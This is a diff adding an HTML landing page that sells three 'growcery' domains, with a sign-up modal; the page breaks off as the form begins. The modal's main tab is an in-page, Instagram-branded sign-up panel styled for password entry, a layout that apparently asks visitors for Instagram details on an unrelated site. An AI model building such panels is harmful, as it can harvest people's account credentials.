@@ -1,0 +1,1296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BuyDomains — Premium Growcery Domains</title>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,300;0,9..144,600;0,9..144,700;1,9..144,300;1,9..144,600&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --bg:        #faf8f4;
+  --surface:   #ffffff;
+  --card:      #ffffff;
+  --card2:     #f4f1eb;
+  --border:    #e8e2d9;
+  --border2:   #d5cec2;
+  --accent:    #2d6a4f;
+  --accent-lt: #d8f0e4;
+  --accent2:   #e07b2e;
+  --accent2-lt:#fdecd8;
+  --red:       #c94040;
+  --red-lt:    #fde8e8;
+  --text:      #1a1714;
+  --text2:     #5c5650;
+  --text3:     #9c9590;
+  --shadow:    0 2px 12px rgba(0,0,0,0.07);
+  --shadow-lg: 0 8px 32px rgba(0,0,0,0.10);
+}
+
+html { scroll-behavior: smooth; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Plus Jakarta Sans', sans-serif;
+  font-size: 15px;
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* ── NAV ── */
+nav {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 20px;
+  height: 60px;
+  background: rgba(250,248,244,0.92);
+  backdrop-filter: blur(12px);
+  border-bottom: 1px solid var(--border);
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+.logo {
+  font-family: 'Fraunces', serif;
+  font-weight: 700;
+  font-size: 19px;
+  color: var(--text);
+  text-decoration: none;
+  letter-spacing: -0.3px;
+}
+.logo span { color: var(--accent); }
+.nav-right { display: flex; gap: 8px; align-items: center; }
+
+.btn-ghost {
+  background: transparent;
+  border: 1.5px solid var(--border2);
+  color: var(--text2);
+  padding: 7px 14px;
+  border-radius: 10px;
+  cursor: pointer;
+  font-family: 'Plus Jakarta Sans', sans-serif;
+  font-size: 13px;
+  font-weight: 600;
+  transition: all .18s;
+  text-decoration: none;
+  white-space: nowrap;
+}
+.btn-ghost:hover { border-color: var(--accent); color: var(--accent); background: var(--accent-lt); }
+
+.btn-primary {
+  background: var(--accent);
+  border: none;
+  color: #fff;
+  padding: 8px 16px;
+  border-radius: 10px;
+  cursor: pointer;
+  font-family: 'Plus Jakarta Sans', sans-serif;
+  font-size: 13px;
+  font-weight: 700;
+  transition: all .18s;
+  text-decoration: none;
+  white-space: nowrap;
+}
+.btn-primary:hover { background: #235540; transform: translateY(-1px); box-shadow: 0 4px 14px rgba(45,106,79,0.3); }
+
+/* ── HERO ── */
+.hero {
+  padding: 48px 20px 40px;
+  max-width: 680px;
+  margin: 0 auto;
+  text-align: center;
+}
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 7px;
+  background: var(--accent-lt);
+  border: 1.5px solid rgba(45,106,79,0.2);
+  border-radius: 100px;
+  padding: 5px 14px;
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--accent);
+  margin-bottom: 24px;
+  animation: fadeUp 0.5s ease forwards;
+}
+.hero-badge::before {
+  content: '';
+  width: 6px; height: 6px;
+  background: var(--accent);
+  border-radius: 50%;
+  animation: pulse 2s infinite;
+}
+@keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.5;transform:scale(0.8)} }
+
+h1 {
+  font-family: 'Fraunces', serif;
+  font-size: clamp(36px, 9vw, 64px);
+  font-weight: 700;
+  line-height: 1.05;
+  letter-spacing: -1.5px;
+  color: var(--text);
+  margin-bottom: 20px;
+  animation: fadeUp 0.55s ease 0.08s both;
+}
+h1 em { font-style: italic; color: var(--accent); }
+
+.hero-sub {
+  color: var(--text2);
+  font-size: 16px;
+  line-height: 1.7;
+  margin-bottom: 32px;
+  animation: fadeUp 0.55s ease 0.15s both;
+  max-width: 480px;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+.hero-ctas {
+  display: flex;
+  gap: 10px;
+  flex-wrap: wrap;
+  justify-content: center;
+  animation: fadeUp 0.55s ease 0.22s both;
+}
+.btn-xl {
+  background: var(--accent);
+  border: none;
+  color: #fff;
+  padding: 14px 28px;
+  border-radius: 12px;
+  cursor: pointer;
+  font-family: 'Plus Jakarta Sans', sans-serif;
+  font-size: 15px;
+  font-weight: 700;
+  transition: all .22s;
+  flex: 1;
+  min-width: 0;
+  max-width: 240px;
+}
+.btn-xl:hover { background: #235540; transform: translateY(-2px); box-shadow: 0 8px 24px rgba(45,106,79,0.3); }
+.btn-xl-ghost {
+  background: var(--surface);
+  border: 1.5px solid var(--border2);
+  color: var(--text);
+  padding: 14px 28px;
+  border-radius: 12px;
+  cursor: pointer;
+  font-family: 'Plus Jakarta Sans', sans-serif;
+  font-size: 15px;
+  font-weight: 600;
+  transition: all .22s;
+  flex: 1;
+  min-width: 0;
+  max-width: 240px;
+}
+.btn-xl-ghost:hover { border-color: var(--accent); color: var(--accent); background: var(--accent-lt); }
+
+/* ── TICKER ── */
+.ticker-wrap {
+  overflow: hidden;
+  background: var(--accent);
+  padding: 11px 0;
+  margin: 0 0 48px;
+}
+.ticker {
+  display: flex;
+  gap: 48px;
+  animation: ticker 26s linear infinite;
+  width: max-content;
+}
+.ticker-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-size: 12px;
+  font-weight: 600;
+  letter-spacing: 0.8px;
+  text-transform: uppercase;
+  color: rgba(255,255,255,0.85);
+  white-space: nowrap;
+}
+.ticker-item .dot { color: rgba(255,255,255,0.4); }
+@keyframes ticker { from { transform: translateX(0) } to { transform: translateX(-50%) } }
+
+/* ── SECTION WRAPPER ── */
+.section {
+  padding: 0 20px 64px;
+  max-width: 900px;
+  margin: 0 auto;
+}
+.section-label {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  color: var(--text3);
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  margin-bottom: 24px;
+}
+.section-label::after {
+  content: '';
+  flex: 1;
+  height: 1px;
+  background: var(--border);
+}
+
+/* ── DOMAIN CARDS ── */
+.domains-grid {
+  display: flex;
+  flex-direction: column;
+  gap: 14px;
+}
+
+.domain-card {
+  background: var(--card);
+  border: 1.5px solid var(--border);
+  border-radius: 18px;
+  padding: 24px 20px;
+  cursor: pointer;
+  transition: all .25s;
+  position: relative;
+  overflow: hidden;
+  animation: fadeUp 0.5s ease both;
+}
+.domain-card:nth-child(1) { animation-delay: 0.1s; }
+.domain-card:nth-child(2) { animation-delay: 0.18s; }
+.domain-card:nth-child(3) { animation-delay: 0.26s; }
+.domain-card:active { transform: scale(0.99); }
+
+@media (hover: hover) {
+  .domain-card:hover {
+    border-color: var(--accent);
+    box-shadow: 0 12px 40px rgba(45,106,79,0.12);
+    transform: translateY(-3px);
+  }
+}
+
+/* Color accent bar on left */
+.domain-card::before {
+  content: '';
+  position: absolute;
+  left: 0; top: 0; bottom: 0;
+  width: 4px;
+  border-radius: 18px 0 0 18px;
+  background: var(--accent);
+  transition: width .25s;
+}
+.domain-card.card-shop::before { background: var(--accent2); }
+.domain-card.card-in::before { background: var(--red); }
+@media (hover:hover) { .domain-card:hover::before { width: 6px; } }
+
+.card-top {
+  display: flex;
+  align-items: flex-start;
+  justify-content: space-between;
+  margin-bottom: 14px;
+  gap: 12px;
+}
+.domain-tld-pill {
+  display: inline-flex;
+  align-items: center;
+  gap: 5px;
+  background: var(--accent-lt);
+  color: var(--accent);
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  padding: 4px 10px;
+  border-radius: 100px;
+  border: 1.5px solid rgba(45,106,79,0.15);
+}
+.domain-tld-pill.shop { background: var(--accent2-lt); color: var(--accent2); border-color: rgba(224,123,46,0.18); }
+.domain-tld-pill.in { background: var(--red-lt); color: var(--red); border-color: rgba(201,64,64,0.15); }
+
+.featured-pill {
+  background: #fff4e0;
+  color: var(--accent2);
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  padding: 4px 10px;
+  border-radius: 100px;
+  border: 1.5px solid rgba(224,123,46,0.2);
+  flex-shrink: 0;
+}
+
+.domain-name {
+  font-family: 'Fraunces', serif;
+  font-size: 32px;
+  font-weight: 600;
+  letter-spacing: -0.8px;
+  line-height: 1;
+  margin-bottom: 10px;
+  color: var(--text);
+}
+.domain-name .tld { color: var(--accent); }
+.domain-name .tld-shop { color: var(--accent2); }
+.domain-name .tld-in { color: var(--red); }
+
+.domain-desc {
+  font-size: 13px;
+  color: var(--text2);
+  line-height: 1.6;
+  margin-bottom: 16px;
+}
+
+.domain-meta {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+  margin-bottom: 18px;
+}
+.meta-chip {
+  background: var(--card2);
+  border: 1px solid var(--border);
+  color: var(--text2);
+  font-size: 12px;
+  font-weight: 500;
+  padding: 4px 10px;
+  border-radius: 8px;
+}
+.meta-chip.avail {
+  background: var(--accent-lt);
+  color: var(--accent);
+  border-color: rgba(45,106,79,0.15);
+  font-weight: 700;
+}
+.meta-chip.avail::before { content: '● '; font-size: 9px; }
+
+.domain-cta-btn {
+  width: 100%;
+  background: var(--card2);
+  border: 1.5px solid var(--border);
+  color: var(--text);
+  padding: 13px;
+  border-radius: 12px;
+  cursor: pointer;
+  font-family: 'Plus Jakarta Sans', sans-serif;
+  font-size: 14px;
+  font-weight: 700;
+  transition: all .2s;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+}
+.domain-card:not(.card-shop):not(.card-in) .domain-cta-btn:hover,
+.domain-card:not(.card-shop):not(.card-in) .domain-cta-btn:active {
+  background: var(--accent); color: #fff; border-color: var(--accent);
+}
+.domain-card.card-shop .domain-cta-btn:hover,
+.domain-card.card-shop .domain-cta-btn:active {
+  background: var(--accent2); color: #fff; border-color: var(--accent2);
+}
+.domain-card.card-in .domain-cta-btn:hover,
+.domain-card.card-in .domain-cta-btn:active {
+  background: var(--red); color: #fff; border-color: var(--red);
+}
+
+/* ── STATS ── */
+.stats-row {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 12px;
+  margin: 40px 0;
+}
+.stat-block {
+  background: var(--card);
+  border: 1.5px solid var(--border);
+  border-radius: 16px;
+  padding: 20px 16px;
+  text-align: center;
+}
+.stat-num {
+  font-family: 'Fraunces', serif;
+  font-size: 28px;
+  font-weight: 600;
+  color: var(--accent);
+  line-height: 1;
+  margin-bottom: 6px;
+}
+.stat-label { color: var(--text3); font-size: 11px; font-weight: 600; letter-spacing: 0.3px; line-height: 1.4; }
+
+/* ── WHY SECTION ── */
+.why-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 12px;
+}
+.why-card {
+  background: var(--card);
+  border: 1.5px solid var(--border);
+  border-radius: 16px;
+  padding: 20px;
+}
+.why-icon {
+  width: 40px; height: 40px;
+  background: var(--accent-lt);
+  border-radius: 12px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 18px;
+  margin-bottom: 12px;
+}
+.why-card h3 {
+  font-family: 'Fraunces', serif;
+  font-size: 15px;
+  font-weight: 600;
+  margin-bottom: 6px;
+  letter-spacing: -0.3px;
+}
+.why-card p { color: var(--text2); font-size: 12px; line-height: 1.65; }
+
+/* ── FOOTER ── */
+footer {
+  background: var(--card);
+  border-top: 1.5px solid var(--border);
+  padding: 28px 20px;
+  text-align: center;
+}
+.footer-logo {
+  font-family: 'Fraunces', serif;
+  font-weight: 700;
+  font-size: 17px;
+  color: var(--text);
+  margin-bottom: 12px;
+}
+.footer-logo span { color: var(--accent); }
+.footer-links { display: flex; justify-content: center; gap: 20px; margin-bottom: 14px; }
+.footer-links a { color: var(--text2); text-decoration: none; font-size: 13px; font-weight: 500; }
+.footer-links a:hover { color: var(--accent); }
+.footer-copy { color: var(--text3); font-size: 12px; }
+
+@keyframes fadeUp {
+  from { opacity: 0; transform: translateY(16px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+
+/* ══════════════════════════════════
+   MODAL
+══════════════════════════════════ */
+.modal-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(26,23,20,0.55);
+  backdrop-filter: blur(6px);
+  z-index: 200;
+  display: flex;
+  align-items: flex-end; /* bottom sheet on mobile */
+  justify-content: center;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity .25s;
+}
+.modal-overlay.open { opacity: 1; pointer-events: all; }
+
+.modal {
+  background: var(--surface);
+  width: 100%;
+  max-width: 480px;
+  border-radius: 24px 24px 0 0;
+  padding: 28px 20px 40px;
+  position: relative;
+  transform: translateY(100%);
+  transition: transform .35s cubic-bezier(0.32, 0.72, 0, 1);
+  max-height: 92vh;
+  overflow-y: auto;
+  -webkit-overflow-scrolling: touch;
+}
+.modal-overlay.open .modal {
+  transform: translateY(0);
+}
+
+/* On wider screens: centered card */
+@media (min-width: 540px) {
+  .modal-overlay { align-items: center; }
+  .modal { border-radius: 24px; max-width: 440px; padding: 32px; max-height: 88vh; }
+  .modal-overlay.open .modal { transform: none; }
+  .modal { transform: scale(0.96) translateY(10px); }
+  .modal-overlay.open .modal { transform: scale(1) translateY(0); }
+}
+
+/* Drag handle for mobile */
+.modal-handle {
+  width: 40px;
+  height: 4px;
+  background: var(--border2);
+  border-radius: 4px;
+  margin: 0 auto 20px;
+}
+@media (min-width: 540px) { .modal-handle { display: none; } }
+
+.modal-close {
+  position: absolute;
+  top: 16px; right: 16px;
+  background: var(--card2);
+  border: 1.5px solid var(--border);
+  color: var(--text2);
+  width: 32px; height: 32px;
+  border-radius: 10px;
+  cursor: pointer;
+  font-size: 15px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: all .15s;
+  line-height: 1;
+}
+.modal-close:hover { background: var(--border); color: var(--text); }
+
+.modal-eyebrow {
+  font-size: 11px;
+  font-weight: 700;
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+  color: var(--accent);
+  margin-bottom: 6px;
+}
+.modal-title {
+  font-family: 'Fraunces', serif;
+  font-size: 26px;
+  font-weight: 600;
+  letter-spacing: -0.5px;
+  margin-bottom: 4px;
+}
+.modal-sub { color: var(--text2); font-size: 13px; margin-bottom: 22px; line-height: 1.5; }
+
+/* Domain badge */
+.domain-badge-row {
+  display: none;
+  align-items: center;
+  gap: 10px;
+  background: var(--accent-lt);
+  border: 1.5px solid rgba(45,106,79,0.2);
+  border-radius: 12px;
+  padding: 10px 14px;
+  margin-bottom: 20px;
+}
+.domain-badge-row.show { display: flex; }
+.domain-badge-icon { font-size: 18px; }
+.domain-badge-name {
+  font-family: 'Fraunces', serif;
+  font-size: 18px;
+  font-weight: 600;
+  color: var(--text);
+  flex: 1;
+}
+.domain-badge-tag {
+  background: var(--accent);
+  color: #fff;
+  font-size: 10px;
+  font-weight: 700;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  padding: 3px 9px;
+  border-radius: 6px;
+}
+
+/* Tabs */
+.modal-tabs {
+  display: flex;
+  background: var(--card2);
+  border-radius: 12px;
+  padding: 4px;
+  margin-bottom: 24px;
+  gap: 4px;
+}
+.tab-btn {
+  flex: 1;
+  background: transparent;
+  border: none;
+  color: var(--text2);
+  padding: 10px 8px;
+  border-radius: 10px;
+  cursor: pointer;
+  font-family: 'Plus Jakarta Sans', sans-serif;
+  font-size: 13px;
+  font-weight: 600;
+  transition: all .2s;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 7px;
+}
+.tab-btn.active {
+  background: var(--surface);
+  color: var(--text);
+  box-shadow: var(--shadow);
+}
+.tab-btn.disabled {
+  opacity: 0.38;
+  cursor: not-allowed;
+  pointer-events: none;
+}
+.tab-btn.disabled .tab-coming-soon {
+  display: inline-block;
+}
+.tab-coming-soon {
+  display: none;
+  font-size: 9px;
+  font-weight: 700;
+  letter-spacing: 0.8px;
+  text-transform: uppercase;
+  background: var(--border);
+  color: var(--text3);
+  padding: 2px 6px;
+  border-radius: 4px;
+  margin-left: 2px;
+}
+.tab-btn svg { flex-shrink: 0; }
+
+/* Form panels */
+.form-panel { display: none; }
+.form-panel.active { display: block; }
+
+/* Sub panels */
+.sub-panel { display: none; }
+.sub-panel.active { display: block; }
+
+/* Fields */
+.form-row { margin-bottom: 14px; }
+.form-label {
+  display: block;
+  font-size: 12px;
+  font-weight: 700;
+  color: var(--text2);
+  margin-bottom: 7px;
+  letter-spacing: 0.2px;
+}
+.field-wrap { position: relative; }
+.field-icon {
+  position: absolute;
+  left: 12px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: var(--text3);
+  font-size: 15px;
+  pointer-events: none;
+  line-height: 1;
+}
+.form-input {
+  width: 100%;
+  background: var(--bg);
+  border: 1.5px solid var(--border);
+  color: var(--text);
+  padding: 12px 12px 12px 38px;
+  border-radius: 12px;
+  font-family: 'Plus Jakarta Sans', sans-serif;
+  font-size: 15px;
+  outline: none;
+  transition: border-color .18s, box-shadow .18s;
+  -webkit-appearance: none;
+}
+.form-input:focus {
+  border-color: var(--accent);
+  box-shadow: 0 0 0 3px rgba(45,106,79,0.1);
+  background: #fff;
+}
+.form-input::placeholder { color: var(--text3); }
+.form-input.no-icon { padding-left: 14px; }
+.pwd-toggle {
+  position: absolute;
+  right: 12px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: none;
+  border: none;
+  color: var(--text3);
+  cursor: pointer;
+  font-size: 12px;
+  font-family: 'Plus Jakarta Sans', sans-serif;
+  font-weight: 600;
+  padding: 0;
+}
+.pwd-toggle:hover { color: var(--text); }
+
+/* Password strength */
+.pwd-strength { margin-top: 8px; display: none; }
+.strength-bars { display: flex; gap: 4px; margin-bottom: 5px; }
+.sbar {
+  flex: 1; height: 3px;
+  background: var(--border);
+  border-radius: 3px;
+  transition: background .25s;
+}
+.sbar.weak   { background: var(--red); }
+.sbar.medium { background: #e09a20; }
+.sbar.strong { background: var(--accent); }
+.sbar-label { font-size: 11px; color: var(--text3); }
+
+/* Divider */
+.form-divider {
+  text-align: center;
+  color: var(--text3);
+  font-size: 11px;
+  font-weight: 600;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  position: relative;
+  margin: 18px 0;
+}
+.form-divider::before, .form-divider::after {
+  content: '';
+  position: absolute;
+  top: 50%;
+  width: calc(50% - 30px);
+  height: 1px;
+  background: var(--border);
+}
+.form-divider::before { left: 0; }
+.form-divider::after { right: 0; }
+
+/* Social link row */
+.social-row {
+  background: var(--bg);
+  border: 1.5px solid var(--border);
+  border-radius: 12px;
+  padding: 12px 14px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  cursor: pointer;
+  transition: border-color .18s;
+  margin-bottom: 10px;
+  -webkit-tap-highlight-color: transparent;
+}
+.social-row:hover { border-color: var(--border2); }
+.social-row-icon {
+  width: 36px; height: 36px;
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+.g-bg { background: #eef3ff; }
+.ig-bg { background: linear-gradient(135deg,#fff0e6,#fce4f3); }
+.social-row-text { flex: 1; }
+.social-row-title { font-size: 13px; font-weight: 700; color: var(--text); margin-bottom: 1px; }
+.social-row-desc { font-size: 11px; color: var(--text3); }
+.social-checkbox {
+  width: 22px; height: 22px;
+  border: 2px solid var(--border2);
+  border-radius: 7px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 12px;
+  color: transparent;
+  transition: all .18s;
+  flex-shrink: 0;
+}
+.social-checkbox.on { background: var(--accent); border-color: var(--accent); color: #fff; }
+
+/* Error */
+.form-error {
+  background: var(--red-lt);
+  border: 1.5px solid rgba(201,64,64,0.2);
+  color: var(--red);
+  font-size: 13px;
+  font-weight: 600;
+  padding: 10px 14px;
+  border-radius: 10px;
+  margin-bottom: 14px;
+  display: none;
+}
+
+.form-note {
+  font-size: 12px;
+  color: var(--text3);
+  text-align: center;
+  margin-bottom: 14px;
+  line-height: 1.6;
+}
+.form-note a { color: var(--accent); text-decoration: none; font-weight: 600; }
+
+.btn-submit {
+  width: 100%;
+  background: var(--accent);
+  border: none;
+  color: #fff;
+  padding: 15px;
+  border-radius: 14px;
+  cursor: pointer;
+  font-family: 'Plus Jakarta Sans', sans-serif;
+  font-size: 15px;
+  font-weight: 700;
+  transition: all .22s;
+  letter-spacing: 0.2px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+}
+.btn-submit:hover { background: #235540; transform: translateY(-1px); box-shadow: 0 6px 20px rgba(45,106,79,0.3); }
+.btn-submit:active { transform: scale(0.99); }
+
+.switch-mode {
+  text-align: center;
+  margin-top: 16px;
+  font-size: 13px;
+  color: var(--text2);
+}
+.switch-mode a { color: var(--accent); font-weight: 700; cursor: pointer; text-decoration: none; }
+
+/* Forgot */
+.forgot-row { text-align: right; margin-bottom: 16px; margin-top: -6px; }
+.forgot-row a { font-size: 12px; color: var(--accent); font-weight: 600; text-decoration: none; cursor: pointer; }
+
+/* ── SUCCESS ── */
+.success-screen {
+  display: none;
+  text-align: center;
+  padding: 20px 10px;
+}
+.success-ring {
+  width: 72px; height: 72px;
+  background: var(--accent-lt);
+  border: 2.5px solid var(--accent);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 30px;
+  margin: 0 auto 20px;
+  animation: popIn .5s cubic-bezier(0.34,1.56,0.64,1) both;
+}
+@keyframes popIn {
+  from { transform: scale(0.4); opacity: 0; }
+  to   { transform: scale(1);   opacity: 1; }
+}
+.success-title {
+  font-family: 'Fraunces', serif;
+  font-size: 26px;
+  font-weight: 600;
+  letter-spacing: -0.5px;
+  margin-bottom: 10px;
+}
+.success-sub { color: var(--text2); font-size: 14px; line-height: 1.65; margin-bottom: 28px; }
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <a href="#" class="logo">buy<span>.</span>domains</a>
+  <div class="nav-right">
+    <button class="btn-ghost" onclick="openModal('login')">Log in</button>
+    <button class="btn-primary" onclick="openModal('signup')">Sign up</button>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-badge">🌱 Premium Domains Available</div>
+  <h1>Own the future<br>of <em>grocery</em><br>commerce.</h1>
+  <p class="hero-sub">Secure the growcery namespace before it's gone — premium .ai, .shop, and .co.in domains built for tomorrow's food brands.</p>
+  <div class="hero-ctas">
+    <button class="btn-xl" onclick="document.getElementById('domains').scrollIntoView({behavior:'smooth'})">See Domains ↓</button>
+    <button class="btn-xl-ghost" onclick="openModal('signup')">Create Account</button>
+  </div>
+</section>
+
+<!-- TICKER -->
+<div class="ticker-wrap">
+  <div class="ticker">
+    <span class="ticker-item"><span class="dot">◆</span>growcery.ai — AI Commerce</span>
+    <span class="ticker-item"><span class="dot">◆</span>growcery.shop — D2C Ready</span>
+    <span class="ticker-item"><span class="dot">◆</span>growcery.co.in — India Market</span>
+    <span class="ticker-item"><span class="dot">◆</span>Escrow Protected · Fast Transfer</span>
+    <span class="ticker-item"><span class="dot">◆</span>growcery.ai — AI Commerce</span>
+    <span class="ticker-item"><span class="dot">◆</span>growcery.shop — D2C Ready</span>
+    <span class="ticker-item"><span class="dot">◆</span>growcery.co.in — India Market</span>
+    <span class="ticker-item"><span class="dot">◆</span>Escrow Protected · Fast Transfer</span>
+  </div>
+</div>
+
+<!-- DOMAINS -->
+<div class="section" id="domains">
+  <div class="section-label">Featured Listings</div>
+
+  <div class="domains-grid">
+
+    <!-- growcery.shop -->
+    <div class="domain-card card-shop" onclick="openModal('signup','growcery.shop')">
+      <div class="card-top">
+        <span class="domain-tld-pill shop">🛒 .shop domain</span>
+        <span class="featured-pill">🔥 HOT</span>
+      </div>
+      <div class="domain-name">growcery<span class="tld-shop">.shop</span></div>
+      <p class="domain-desc">Purpose-built for e-commerce. Perfect for online grocery stores, fresh produce marketplaces, and direct-to-consumer food brands worldwide.</p>
+      <div class="domain-meta">
+        <span class="meta-chip avail">Available</span>
+        <span class="meta-chip">E-Commerce</span>
+        <span class="meta-chip">Global</span>
+      </div>
+      <button class="domain-cta-btn">Inquire About This Domain →</button>
+    </div>
+
+    <!-- growcery.ai -->
+    <div class="domain-card" onclick="openModal('signup','growcery.ai')">
+      <div class="card-top">
+        <span class="domain-tld-pill">🤖 .ai domain</span>
+      </div>
+      <div class="domain-name">growcery<span class="tld">.ai</span></div>
+      <p class="domain-desc">Ideal for AI-powered grocery platforms, smart delivery apps, or intelligent pantry startups. The .ai TLD signals cutting-edge tech at a glance.</p>
+      <div class="domain-meta">
+        <span class="meta-chip avail">Available</span>
+        <span class="meta-chip">AI / FoodTech</span>
+        <span class="meta-chip">8 chars</span>
+      </div>
+      <button class="domain-cta-btn">Inquire About This Domain →</button>
+    </div>
+
+    <!-- growcery.co.in -->
+    <div class="domain-card card-in" onclick="openModal('signup','growcery.co.in')">
+      <div class="card-top">
+        <span class="domain-tld-pill in">🇮🇳 .co.in domain</span>
+      </div>
+      <div class="domain-name">growcery<span class="tld-in">.co.in</span></div>
+      <p class="domain-desc">Signals local trust for the Indian market. Ideal for grocery startups targeting Tier 1 & 2 cities or pan-India delivery services.</p>
+      <div class="domain-meta">
+        <span class="meta-chip avail">Available</span>
+        <span class="meta-chip">India Market</span>
+        <span class="meta-chip">₹ Economy</span>
+      </div>
+      <button class="domain-cta-btn">Inquire About This Domain →</button>
+    </div>
+
+  </div>
+
+  <!-- Stats -->
+  <div class="stats-row">
+    <div class="stat-block">
+      <div class="stat-num">3</div>
+      <div class="stat-label">Premium domains</div>
+    </div>
+    <div class="stat-block">
+      <div class="stat-num">₹1.2T</div>
+      <div class="stat-label">India grocery market</div>
+    </div>
+    <div class="stat-block">
+      <div class="stat-num">48h</div>
+      <div class="stat-label">Avg. transfer time</div>
+    </div>
+  </div>
+
+  <!-- Why -->
+  <div class="section-label">Why BuyDomains</div>
+  <div class="why-grid">
+    <div class="why-card">
+      <div class="why-icon">🔐</div>
+      <h3>Escrow Protected</h3>
+      <p>Funds held in escrow until domain transfer is confirmed. Zero risk.</p>
+    </div>
+    <div class="why-card">
+      <div class="why-icon">⚡</div>
+      <h3>Fast Transfers</h3>
+      <p>Domain transferred and live within 48 hours of payment.</p>
+    </div>
+    <div class="why-card">
+      <div class="why-icon">🤝</div>
+      <h3>Broker Support</h3>
+      <p>Our brokers handle all negotiations on your behalf.</p>
+    </div>
+    <div class="why-card">
+      <div class="why-icon">📋</div>
+      <h3>Legal Docs</h3>
+      <p>Full transfer agreement and bill of sale included with every sale.</p>
+    </div>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-logo">buy<span>.</span>domains</div>
+  <div class="footer-links">
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">Contact</a>
+  </div>
+  <div class="footer-copy">© 2025 BuyDomains. All rights reserved.</div>
+</footer>
+
+<!-- ══════════════════ MODAL ══════════════════ -->
+<div class="modal-overlay" id="modalOverlay" onclick="overlayClick(event)">
+  <div class="modal" id="modal">
+
+    <div class="modal-handle"></div>
+    <button class="modal-close" onclick="closeModal()" aria-label="Close">✕</button>
+
+    <!-- MAIN FORM -->
+    <div id="mainForm">
+      <div class="modal-eyebrow" id="mEyebrow">New Account</div>
+      <div class="modal-title" id="mTitle">Create your account</div>
+      <div class="modal-sub" id="mSub">Sign up to inquire, save listings and track deals.</div>
+
+      <div class="domain-badge-row" id="domainBadge">
+        <div class="domain-badge-icon">🌐</div>
+        <div class="domain-badge-name" id="domainBadgeName">growcery.ai</div>
+        <div class="domain-badge-tag">Interested</div>
+      </div>
+
+      <!-- Tabs -->
+      <div class="modal-tabs">
+        <button class="tab-btn active" id="tabIG" onclick="switchTab('ig')">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><defs><linearGradient id="igT" x1="0%" y1="100%" x2="100%" y2="0%"><stop offset="0%" stop-color="#f09433"/><stop offset="50%" stop-color="#dc2743"/><stop offset="100%" stop-color="#bc1888"/></linearGradient></defs><rect x="2" y="2" width="20" height="20" rx="5" fill="url(#igT)"/><circle cx="12" cy="12" r="4" stroke="white" stroke-width="1.8" fill="none"/><circle cx="17.5" cy="6.5" r="1.2" fill="white"/></svg>
+          Instagram
+        </button>
+        <button class="tab-btn disabled" id="tabG" title="Google sign-up coming soon">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
+          Google
+          <span class="tab-coming-soon">Soon</span>
+        </button>
+      </div>
+
+      <div class="form-error" id="formErr"></div>
+
+      <!-- INSTAGRAM PANEL (first, active) -->
+      <div class="form-panel active" id="panelIG">
+
+        <!-- Signup -->
+        <div class="sub-panel active" id="igSignup">
+          <div class="form-row">
